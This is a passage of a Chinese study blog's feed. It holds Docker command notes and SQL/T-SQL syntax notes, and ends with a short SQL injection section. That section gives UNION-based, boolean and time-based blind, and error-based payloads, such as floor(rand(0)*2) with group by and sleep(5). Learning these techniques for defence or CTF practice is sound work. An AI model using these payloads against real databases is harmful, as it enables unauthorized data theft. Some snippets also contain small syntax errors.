<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker start 容器名（or容器id）</span><br></pre></td></tr></table></figure>

<p>文件拷贝</p>
<p>将文件拷贝到容器中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp 需要拷贝的文件or目录 容器名称：容器目录</span><br></pre></td></tr></table></figure>

<p>文件从容器拷贝除来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp 容器名称：容器目录 需要拷贝的文件or目录</span><br></pre></td></tr></table></figure>

<h4 id="目录挂载"><a href="#目录挂载" class="headerlink" title="目录挂载"></a>目录挂载</h4><p>创建容器时，将宿主机的目录与容器内的目录进行映射，这样我们就可以通过修改宿主机某个目录的文件从而去影响容器</p>
<p>创建容器 添加<code>-v</code>参数 后面为 宿主机目录：容器目录</p>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -di -v /usr/local/myhtml：/var/local/myhtml --name=mycentos3 centos:7</span><br></pre></td></tr></table></figure>

<p>如果你共享的是多级目录，可能会出现权限不足的提示</p>
<p>因为centos7中的安全模块selinux把权限禁掉了，我们需要添加参数<code>--priviledged=true</code>来解决挂载的目录没有权限问题</p>
<h4 id="查看容器ip"><a href="#查看容器ip" class="headerlink" title="查看容器ip"></a>查看容器ip</h4><p>可用以下命令查看容器运行各种参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker inspect 容器名称（容器id）</span><br></pre></td></tr></table></figure>

<p>也可以直接执行下面命令输出IP地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker inspect --format='&#123;&#123;.Networksettings.IPAddress&#125;&#125;' 容器名称（容器id）</span><br></pre></td></tr></table></figure>

<h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器名称（容器id）</span><br></pre></td></tr></table></figure>



<h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker compose"></a>docker compose</h2><p><a href="https://www.cnblogs.com/zhujingzhi/p/9786622.html" target="_blank" rel="noopener">docker-compose cnblog</a></p>
<p><a href="https://www.jianshu.com/p/658911a8cff3" target="_blank" rel="noopener">docker-compose 简书</a></p>
<p><a href="https://www.runoob.com/docker/docker-compose.html" target="_blank" rel="noopener">docker-compose 菜鸟教程</a></p>
<h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p><a href="https://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a></p>
<p><a href="https://www.cnblogs.com/bethal/p/5945015.html" target="_blank" rel="noopener">docker常用命令</a></p>
<p><a href="https://www.cnblogs.com/minseo/p/11548177.html" target="_blank" rel="noopener">docker-compose</a></p>
<p><a href="https://www.jianshu.com/p/7893af4976d9" target="_blank" rel="noopener">docker-compose1</a></p>
<p><a href="https://www.jianshu.com/p/ca1623ac7723" target="_blank" rel="noopener">docker &amp; docker-compose</a></p>
]]></content>
  </entry>
  <entry>
    <title>SQL语法</title>
    <url>/2020/02/29/SQL%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00-information-schema数据库"><a href="#0x00-information-schema数据库" class="headerlink" title="0x00    information_schema数据库"></a>0x00    information_schema数据库</h2><p>该库是mysql数据库中记录所有表的信息，为我们提供了各种状态、权限和配置信息等等。</p>
<blockquote>
<p>Mysql中的INFORMATION_SCHEMA数据库包含了一些表和视图，提供了访问数据库元数据的方式。</p>
<p>元数据（数据词典、系统目录）是关于数据的数据，如：数据库名或表名，列的数据类型，访问权限等。</p>
</blockquote>
<a id="more"></a>
<p>说明：</p>
<ul>
<li>SCHEMATA：数据库中的信息，一般显示出数据库中的各个数据库及其简要信息</li>
<li>TABLES：数据库中所有表的信息</li>
<li>COLUMNS：表的所有列信息</li>
<li>STATISTICS:表的索引信息</li>
<li>USER_PRIVILEGES：用户权限信息</li>
<li>SCHEMA_PRIVILEGES：数据库权限信息</li>
<li>TABLE_PRIVILEGES：表权限信息</li>
<li>COLUMN_PRIVILEGES：列权限信息</li>
<li>CHARACTER_SETS：关于可用字符集信息</li>
<li>COLLATIONS（[kə’leɪʃn] 核对，小吃，这里意思是排序规则）：可用字符集的排序信息</li>
<li>COLLATION_CHARACTER_SET_APPLICABILITY：指明可用与校对的字符集</li>
<li>TABLE_CONSTRAINTS：描述存在约束的表</li>
<li>KEY_COLUMN_USAGE（[ˈjusɪdʒ]使用；用法；惯例）：描述具有约束的键列</li>
<li>ROUTINES：关于存储子程序的信息，不包含自定义函数</li>
<li>VIEWS：视图信息</li>
<li>TRIGGERS：触发器信息</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> INFORMATION_SCHEMA.ROUTINES;</span><br></pre></td></tr></table></figure>



<ul>
<li>不同数据库的sql语句不同</li>
</ul>
<h2 id="0X01-CURD"><a href="#0X01-CURD" class="headerlink" title="0X01    CURD"></a>0X01    CURD</h2><p>插入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> test.a <span class="keyword">values</span> (<span class="keyword">all</span>);</span><br><span class="line"><span class="keyword">insert</span> test.a (<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">'jack'</span>);</span><br></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> test.a <span class="keyword">where</span> <span class="keyword">id</span> &gt;= <span class="number">10</span> <span class="keyword">and</span> <span class="keyword">id</span> &lt;= <span class="number">100</span>;</span><br></pre></td></tr></table></figure>

<p>修改</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test.a </span><br><span class="line"><span class="comment">--添加</span></span><br><span class="line"><span class="keyword">add</span> <span class="keyword">constraint</span> primary <span class="keyword">key</span>(<span class="keyword">id</span>);</span><br><span class="line"><span class="comment">--删除</span></span><br><span class="line"><span class="keyword">drop</span> primary <span class="keyword">key</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add column &lt;name&gt; &lt;dataType&gt; [restriction]</span><br></pre></td></tr></table></figure>



<p>查询字符串</p>
<ul>
<li>‘_’为任意单个字符，’%’为任意长度字符，使用LIKE来判断，但是匹配字符串不包含通配符时，可以用‘=’来判断。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> INFO</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">description <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">'a%bb_'</span></span><br></pre></td></tr></table></figure>

<ul>
<li>数据库字符集为ASCII时，一个汉字需要两个’_’，当字符集为GBK时，只需要一个。 </li>
</ul>
<p>e.g.</p>
<p>查询以‘DB_’开头，且倒数第三个字符为i的课程的详细情况。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> COURSE</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">CNAME <span class="keyword">LIKE</span> <span class="string">'DB\_%i__'</span>;</span><br></pre></td></tr></table></figure>



<p>表的连接</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>建立索引</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">UNIQUE</span>][CLUSTER] <span class="keyword">INDEX</span> &lt;indexName&gt;</span><br><span class="line"><span class="keyword">ON</span> &lt;tableName&gt;(&lt;columnName&gt;[<span class="keyword">order</span>][,&lt;columnName&gt;[<span class="keyword">order</span>]]...);</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> Stusno </span><br><span class="line"><span class="keyword">on</span> Student(Sno);</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> SCno </span><br><span class="line"><span class="keyword">on</span> SC(Sno <span class="keyword">ASC</span>, Cno <span class="keyword">DESC</span>);</span><br></pre></td></tr></table></figure>



<p>给表取别名（用于自身连接等）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">FIRST.Cno, SECOND.Cpno</span><br><span class="line">FROM</span><br><span class="line">drasp_excel.xxx AS FIREST,</span><br><span class="line">drasp_excel.xxx AS SECOND</span><br><span class="line">WHERE</span><br><span class="line">FIRST.Cpno &#x3D; SECOND.Cno;</span><br></pre></td></tr></table></figure>



<p>聚集函数</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">COUNT(*)</span><br><span class="line">COUNT([DISTINCT|ALL] &lt;columnName&gt;)</span><br><span class="line">SUM([DISTINCT|ALL] &lt;columnName&gt;)</span><br><span class="line">AVG([DISTINCT|ALL] &lt;columnName&gt;)</span><br><span class="line">MAX([DISTINCT|ALL] &lt;columnName&gt;)</span><br><span class="line">MIN([DISTINCT|ALL] &lt;columnName&gt;)</span><br></pre></td></tr></table></figure>

<ul>
<li>聚集函数除了COUNT之外，都是跳过空值</li>
<li>==WHERE==子句是==不能==用聚集函数作为条件表达式的</li>
<li>==聚集函数作为条件表达式时，只能用于SELECT子句和GROUP BY中的HAVING子句==</li>
</ul>
<p>GROUP BY 子句</p>
<p>将查询结构按一或多列的值分组，值相等为一组</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno, <span class="keyword">COUNT</span>(Sno)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno;</span><br></pre></td></tr></table></figure>



<p>使用变量</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--第一种</span></span><br><span class="line"><span class="keyword">set</span> @<span class="keyword">num</span> = <span class="number">1</span>; <span class="comment">--or set @num := 1;   </span></span><br><span class="line"><span class="keyword">select</span> @<span class="keyword">num</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--第二种</span></span><br><span class="line"><span class="keyword">set</span> @username = <span class="string">'clevercode'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">	@<span class="keyword">id</span> := <span class="keyword">id</span></span><br><span class="line"><span class="keyword">from</span> sys_user</span><br><span class="line"><span class="keyword">where</span> username = @username;</span><br><span class="line"></span><br><span class="line"><span class="comment">--注意在SELECT的时候只能用:=</span></span><br></pre></td></tr></table></figure>



<p><a href="https://www.cnblogs.com/EasonJim/p/7966918.html" target="_blank" rel="noopener">变量种类</a></p>
<ul>
<li></li>
<li><p>用户变量</p>
</li>
</ul>
<p>不用提前声明，直接使用’@变量名‘，如上面“使用变量”代码块</p>
<p>特点：变量和数据库连接有关，在连接中声明的变量，在存储过程中创建了用户变量后一直到数据库断开，变量才消失。该变量不能跨连接</p>
<p>select @name:=team from organize</p>
<p>如果返回多条的@name只保存最后一条记录</p>
<ul>
<li></li>
</ul>
<p>需求：</p>
<p>在建立视图较为困难的情况下，选择建立一张新表</p>
<p>新表需要某一个表的一个字段所有情况作为字段，同时当别的表进行CUD时做出相应的变动，某个人的某种类型题目分数相加。</p>
<ul>
<li>说实话<a href="https://blog.csdn.net/zhangchu_63/article/details/5728296" target="_blank" rel="noopener">这篇博客</a>并不太明白，讲到了动态查询列，问题基本是一样的，但是似乎不是简单的sql变量语句拼接</li>
</ul>
<p><a href="https://segmentfault.com/q/1010000010486847" target="_blank" rel="noopener">杂谈1</a> <a href="https://blog.csdn.net/bao19901210/article/details/50602343" target="_blank" rel="noopener">杂谈2</a></p>
<h2 id="0x02-授权：授予与收回"><a href="#0x02-授权：授予与收回" class="headerlink" title="0x02 授权：授予与收回"></a>0x02 授权：授予与收回</h2><ul>
<li><p>GRANT</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span>&lt;权限&gt;[,&lt;权限&gt;]...</span><br><span class="line"><span class="keyword">ON</span>&lt;对象类型&gt;&lt;对象名&gt;[,&lt;对象类型&gt;&lt;对象名&gt;]...</span><br><span class="line"><span class="keyword">TO</span> &lt;用户&gt;[,&lt;用户&gt;]... 	<span class="comment">--这里写PUBLIC就是全体用户</span></span><br><span class="line">[<span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>];   <span class="comment">--是否可以传播当前权限</span></span><br></pre></td></tr></table></figure>

<p>e.g.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> billboard.organize</span><br><span class="line"><span class="keyword">TO</span> user1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">UPDATE</span>(billboard.organize.team), <span class="keyword">INSERT</span>, <span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> billboard.organize</span><br><span class="line"><span class="keyword">TO</span> user2</span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>REVOKE</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> &lt;权限&gt;[,&lt;权限&gt;]...</span><br><span class="line"><span class="keyword">ON</span> &lt;对象类型&gt;&lt;对象名&gt;[,&lt;对象类型&gt;&lt;对象名&gt;]...</span><br><span class="line"><span class="keyword">FROM</span> &lt;用户&gt; [,&lt;用户&gt;]...[<span class="keyword">CASCADE</span>|RESTRICT];</span><br></pre></td></tr></table></figure>

<p>e.g.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">UPDATE</span>(Sno)</span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> Student</span><br><span class="line"><span class="keyword">FROM</span> user4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span> </span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> SC</span><br><span class="line"><span class="keyword">FROM</span> USER5</span><br><span class="line"><span class="keyword">CASCADE</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建数据库模式的权限</p>
<p>CREATE USER <code>&lt;username&gt;</code> <code>[WITH][DBA|RESOURCE|CONNECT]</code> </p>
<ul>
<li>只有超级用户才能创建新的数据库用户</li>
<li>有三种权限</li>
</ul>
<table>
<thead>
<tr>
<th>权限</th>
<th>CREATE USER</th>
<th>CREATE SCHEMA</th>
<th>CREATE TABLE</th>
<th>登陆数据库，执行查询操作和操纵</th>
</tr>
</thead>
<tbody><tr>
<td>DBA</td>
<td>:v:</td>
<td>:v:</td>
<td>:v:</td>
<td>:v:</td>
</tr>
<tr>
<td>RESOURCE</td>
<td>:x:</td>
<td>:x:</td>
<td>:v:</td>
<td>:v:</td>
</tr>
<tr>
<td>CONNECT</td>
<td>:x:</td>
<td>:x:</td>
<td>:x:</td>
<td>:v:但必须有相应权限</td>
</tr>
</tbody></table>
</li>
<li><p>角色</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--创建</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ROLE</span> &lt;rolename&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">--授权</span></span><br><span class="line"><span class="keyword">GRANT</span> &lt;权限&gt;[,&lt;权限&gt;]...</span><br><span class="line"><span class="keyword">ON</span> &lt;对象类型&gt;对象名 </span><br><span class="line"><span class="keyword">TO</span> &lt;角色&gt;[,&lt;角色&gt;]...</span><br><span class="line"></span><br><span class="line"><span class="comment">--将一个角色授予其他角色或者用户</span></span><br><span class="line"><span class="keyword">GRANT</span> &lt;角色<span class="number">1</span>&gt;[,&lt;角色<span class="number">2</span>&gt;]...</span><br><span class="line"><span class="keyword">ON</span> &lt;角色<span class="number">3</span>&gt;[,&lt;用户<span class="number">1</span>&gt;]...</span><br><span class="line">[<span class="keyword">WITH</span> <span class="keyword">ADMIN</span> OPTIOIN];	<span class="comment">--是否可授予别的角色或对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--角色权限的收回</span></span><br><span class="line"><span class="keyword">REVOKE</span> &lt;角色<span class="number">1</span>&gt;[,&lt;角色<span class="number">2</span>&gt;]...</span><br><span class="line"><span class="keyword">ON</span> &lt;对象类型&gt;&lt;对象名&gt;</span><br><span class="line"><span class="keyword">FROM</span> &lt;角色&gt;[,&lt;角色&gt;]...</span><br></pre></td></tr></table></figure>




</li>
</ul>
<h1 id="T-SQL语法"><a href="#T-SQL语法" class="headerlink" title="T_SQL语法"></a>T_SQL语法</h1><h2 id="0x00-表的建立"><a href="#0x00-表的建立" class="headerlink" title="0x00    表的建立"></a>0x00    表的建立</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> &lt;<span class="keyword">TABLE</span> <span class="keyword">NAME</span>&gt; (</span><br><span class="line">		</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="0x01-表的连接"><a href="#0x01-表的连接" class="headerlink" title="0x01    表的连接"></a>0x01    表的连接</h2><p>(如果不使用on直接添加在where处，就是全表生成笛卡儿积，再做处理，这样产生了大量的临时表，性能极低，比较好的方法是比较好的方法是==使用ON关键字先处理好相应的数据源==，再使用WHERE)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------内连接</span><br><span class="line">SELECT student.studentono, sname, final</span><br><span class="line">FROM student INNER JOIN score</span><br><span class="line">	ON student.studentno &#x3D; score.studentno</span><br><span class="line">WHERE score.courseno &#x3D; student.courseno</span><br><span class="line"></span><br><span class="line">---------------------外连接</span><br><span class="line">-----左外连接</span><br><span class="line">SELECT student.studentno, sname,, usually, final</span><br><span class="line">FROM</span><br><span class="line">student LEFT JOIN score</span><br><span class="line">	ON student.studentno &#x3D; score.studentno</span><br><span class="line">WHERE </span><br><span class="line">substring(student.studentno, 1, 2) &#x3D; &#39;16&#39;</span><br><span class="line"></span><br><span class="line">-----右外连接</span><br><span class="line">SELECT student.studentno, sname, usually, final</span><br><span class="line">FROM </span><br><span class="line">student RIGHT JOIN score</span><br><span class="line">WHERE</span><br><span class="line">student.studentno &#x3D; score.studentno</span><br><span class="line"></span><br><span class="line">-----全外连接</span><br><span class="line">SELECT courseno, tname, major, teacher.teacherno</span><br><span class="line">FROM </span><br><span class="line">teacher FULL JOIN teach_class</span><br><span class="line">WHERE</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">-----多表连接</span><br><span class="line">SELECT * </span><br><span class="line">FROM </span><br><span class="line">student JOIN score ON ...</span><br><span class="line">		JOIN course ON ...</span><br><span class="line">		JOIN teacher ON ...</span><br><span class="line">WHERE </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">-----交叉连接：全表笛卡儿积，没有where的情况，基本不用</span><br><span class="line">SELECT * </span><br><span class="line">FROM </span><br><span class="line">student CROSS JOIN score</span><br><span class="line"></span><br><span class="line">-----合并结果集，使用UNION</span><br><span class="line">SELECT * FROM student</span><br><span class="line">UNION [all] --all可选，如果写上的话，将重复的行也加上，否则删除</span><br><span class="line">SELECT * FROM course</span><br></pre></td></tr></table></figure>

<h2 id="0x02-子查询"><a href="#0x02-子查询" class="headerlink" title="0x02    子查询"></a>0x02    子查询</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--子查询作表达式，用在WHERE 或者 IN</span><br><span class="line"></span><br><span class="line">--子查询做数据关联，给表取别名，数据库原理上几种比较复杂的操作，记得看看！！</span><br><span class="line"></span><br><span class="line">--利用子查询生成派生表（本质就是在 FROM子句 中 使用子查询）</span><br><span class="line">SELECT TT.studentno, TT.courseno,</span><br><span class="line">		TT.final*0.8 + TT.usually*0.2 AS &#39;ultimate&#39;</span><br><span class="line">FROM (</span><br><span class="line">	SELECT * </span><br><span class="line">    FROM score</span><br><span class="line">    WHERE final &gt; 85</span><br><span class="line">) AS tt</span><br><span class="line">WHERE TT.final * 0.8 + TT.usually * 0.2  &gt; 90</span><br><span class="line"></span><br><span class="line">--子查询修改表数据（批量CRUD）</span><br></pre></td></tr></table></figure>

<h2 id="0x03-EXIXTS-和-NOT-EXISTS"><a href="#0x03-EXIXTS-和-NOT-EXISTS" class="headerlink" title="0x03    EXIXTS 和 NOT EXISTS"></a>0x03    EXIXTS 和 NOT EXISTS</h2><p>（查询到第一个就结束）</p>
<h2 id="0x04-游标"><a href="#0x04-游标" class="headerlink" title="0x04    游标"></a>0x04    <strong>游标</strong></h2><p>（指向内存中结果集的指针，对内存中的结果集进行操作）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DECLEAR cursor_name</span><br><span class="line">CURSOR[GLOBAL|LOCAL][FORWARD_ONLY|SCROLL][STATIC|DINAMIC][READ_ONLY]</span><br><span class="line">FOR select_statement</span><br><span class="line">[;]</span><br></pre></td></tr></table></figure>

<p>运用</p>
<ul>
<li><p>使用FETCH获取记录信息</p>
</li>
<li><p>游标嵌套</p>
</li>
<li><p>查看游标信息</p>
<ul>
<li>CURSOR__STATUS</li>
<li>@@CURSOR_ROWS</li>
<li>@@FETCH_STATUS</li>
</ul>
</li>
</ul>
<h2 id="0x05-大对象的导入"><a href="#0x05-大对象的导入" class="headerlink" title="0x05    大对象的导入"></a>0x05    大对象的导入</h2><ul>
<li>BULK INSERT</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BULK INSERT st_store(表名)</span><br><span class="line">FROM &#39;D:&#x2F;X.txt&#39;</span><br><span class="line">WITH(FORMATFILE &#x3D; &#39;&#x2F;(format_file_path)&#39;)</span><br><span class="line"></span><br><span class="line">BULK INSERT st_store</span><br><span class="line">FROM &#39;&#39;</span><br></pre></td></tr></table></figure>

<h2 id="0x06-索引"><a href="#0x06-索引" class="headerlink" title="0x06    索引"></a>0x06    索引</h2><ol>
<li><p>利用SQL Server图形工具进行创建</p>
</li>
<li><p>利用CREATE INDEX 命令创建索引</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CREATEE [UNIQUE|CLUSTERED|NONCLUSTERED]</span><br><span class="line">INDEX index_name</span><br><span class="line">ON</span><br><span class="line">&#123;table_or_view_name&#125;</span><br><span class="line">(column[ASC|DESC][,.......n])</span><br><span class="line">[INCLUDE(column_namme[,.......n])]</span><br><span class="line">[ON&#123;filegroup_name|default&#125;]</span><br><span class="line">[; ]</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用ALTER INDEX命令修改索引</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">INDEX</span> &#123;index_name | <span class="keyword">ALL</span>&#125;</span><br><span class="line"><span class="keyword">ON</span> &lt;table_or_view_name&gt;</span><br><span class="line">&#123;<span class="keyword">REBUILD</span></span><br><span class="line">	[[<span class="keyword">WITH</span> ( &lt;rebuild_index_option&gt;[,...n])]]</span><br><span class="line">	| <span class="keyword">DISABLE</span></span><br><span class="line">	| REORGANIZE</span><br><span class="line">&#125; [;]</span><br></pre></td></tr></table></figure>
</li>
<li><p>索引碎片检测</p>
</li>
<li><p>索引重组</p>
</li>
</ol>
<h2 id="0x07-事务"><a href="#0x07-事务" class="headerlink" title="0x07    事务"></a>0x07    事务</h2><h2 id="0x08-触发器"><a href="#0x08-触发器" class="headerlink" title="0x08    触发器"></a>0x08    触发器</h2><h2 id="0x09-锁"><a href="#0x09-锁" class="headerlink" title="0x09    锁"></a>0x09    锁</h2><h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><h2 id="0x00-mysql-CLI基本操作"><a href="#0x00-mysql-CLI基本操作" class="headerlink" title="0x00 mysql CLI基本操作"></a>0x00 mysql CLI基本操作</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 显示版本|用户名|数据库路径|操作系统版本</span></span><br><span class="line">select version() | user() | @@datadir | @@version_compile_os</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 字符串连接函数</span></span><br><span class="line">concat(str1, str2, ...)</span><br><span class="line">concat_ws(seperator, str1, str2, ...) </span><br><span class="line">group_concat(str1, str2, ...)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示所有数据库</span></span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用某数据库</span></span><br><span class="line">use your_database_name</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示所有表</span></span><br><span class="line">show tables</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示某表结构</span></span><br><span class="line">desc your_table_name</span><br></pre></td></tr></table></figure>





<h2 id="0x01-mysql基本查询"><a href="#0x01-mysql基本查询" class="headerlink" title="0x01 mysql基本查询"></a>0x01 mysql基本查询</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 基于information_schema</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查数据库</span></span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查某库数据表</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'XXX'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查某表所有列</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'XXX'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取某列数据</span></span><br><span class="line"><span class="keyword">select</span> *** <span class="keyword">from</span> ***</span><br></pre></td></tr></table></figure>



<ul>
<li>小贴士：当数据库使用union查询时，如果union前的数据不存在，那么就会只返回union后的数据，这样就可以显示我们想要看到的数据</li>
</ul>
<h2 id="0x02-基本注入"><a href="#0x02-基本注入" class="headerlink" title="0x02 基本注入"></a>0x02 基本注入</h2><p>思路：通过简单地闭合字符串来构造sql语句。</p>
<p>常见闭合情况：单引号、双引号、括号（以及这几种的组合），还有可能直接采用数字（不用闭合）</p>
<p>结合information_schema使用union查询自己想要的数据</p>
<p>注释方式#， –%20， –， –+</p>
<h2 id="0x03-盲注"><a href="#0x03-盲注" class="headerlink" title="0x03 盲注"></a>0x03 盲注</h2><p>没有回显的注入</p>
<ul>
<li>bool</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">left(database(), 2, 1) &gt; 'h'</span><br><span class="line">substr()</span><br><span class="line">regexp</span><br></pre></td></tr></table></figure>

<ul>
<li>时间</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">if(ascii(left(database(), 1, 1)) &gt; 115, 1, sleep(5))</span><br></pre></td></tr></table></figure>

<ul>
<li>报错</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>, <span class="keyword">count</span>(*), <span class="keyword">concat</span>(<span class="number">0x3a</span>,  <span class="number">0x3a</span>, (<span class="keyword">select</span> <span class="keyword">user</span>()), <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>) * <span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>

<p>基于报错的盲注主要就是三块：</p>
<ol>
<li>普通查询语句中的<code>count(*)</code></li>
<li>分组语句<code>group by</code>后连接函数<code>concat</code>内部<code>floor(rand(0) * 2)</code>，这里的形式不定，只要满足用其来分组就行</li>
<li>分组语句<code>group by</code>后连接函数<code>concat</code>，你想要通过报错查询的信息，比如:<code>database()</code></li>
</ol>
<ul>
<li>合并之后就是<code>select count(*) from YOUR_SCHEMA.YOUR_TABLE group by concat(@@version, floor(rand(0)*2);</code></li>
<li>当然可以在上式基础上更改成更多变式，比如子查询（表被限制）、使用局部变量（rand被限制）</li>
</ul>
<h1 id="函数集合"><a href="#函数集合" class="headerlink" title="函数集合"></a>函数集合</h1><h2 id="0x00-Mysql"><a href="#0x00-Mysql" class="headerlink" title="0x00 Mysql"></a>0x00 Mysql</h2><h3 id="截取字符串"><a href="#截取字符串" class="headerlink" title="截取字符串"></a>截取字符串</h3><ul>
<li>mid(str, start, length)</li>
<li>substr(str, start, length)  substring(str, start, length)</li>
<li>left(string, length)<ul>
<li>ord()该函数可以和上述几个组合将单个字符(若为字符串则转换最左边的的字符)转为ascii</li>
</ul>
</li>
</ul>
<h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><p>regexp（暂用于盲注）</p>
